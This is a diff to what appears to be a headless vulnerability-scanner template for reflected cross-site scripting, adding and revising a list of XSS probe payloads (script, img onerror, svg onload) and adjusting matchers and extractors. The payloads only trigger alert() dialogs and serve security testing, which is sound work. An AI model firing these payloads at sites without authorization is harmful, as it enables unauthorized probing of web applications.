@@ -21,16 +21,17 @@ headless:
 
     payloads:
       xss_payloads:
+        - '<0 name="<svg/onload=alert({{num}})>">'
         - "'\"><script>alert({{num}})</script>"
         - "<script>alert({{num}})</script>"
         - "\"><img src=x onerror=alert({{num}})>"
         - "\"><svg onload=alert({{num}})>"
         - "\"><body onload=alert({{num}})>"
         - "<script>alert(1)</script>"
-        - "'\">><svg/onload=alert(1)>"
-        - "\">';/><u>test123"
-        - "\">';/></script><u>test123"
-        - "\">';/></textarea><u>test123"
+        - "'\">><svg/onload=alert({{num}})>"
+        - "\">';/><u>test{{num}}"
+        - "\">';/></script><u>test{{num}}"
+        - "\">';/></textarea><u>test{{num}}"
 
     fuzzing:
       - part: query
@@ -40,15 +41,15 @@ headless:
           - "{{xss_payloads}}"
 
     stop-at-first-match: true
-    
+
     matchers-condition: or
-    
+
     matchers:
       - type: dsl
         name: xss-dialog
         dsl:
           - xss_triggered == true
-      
+
       - type: word
         name: xss-reflected
         part: body
@@ -56,10 +57,11 @@ headless:
           - "{{xss_payloads}}"
 
     extractors:
-      - type: kval
-        kval:
+      - type: dsl
+        name: full_url
+        dsl:
           - request_url
-      
+
       - type: kval
         kval:
           - xss_payloads
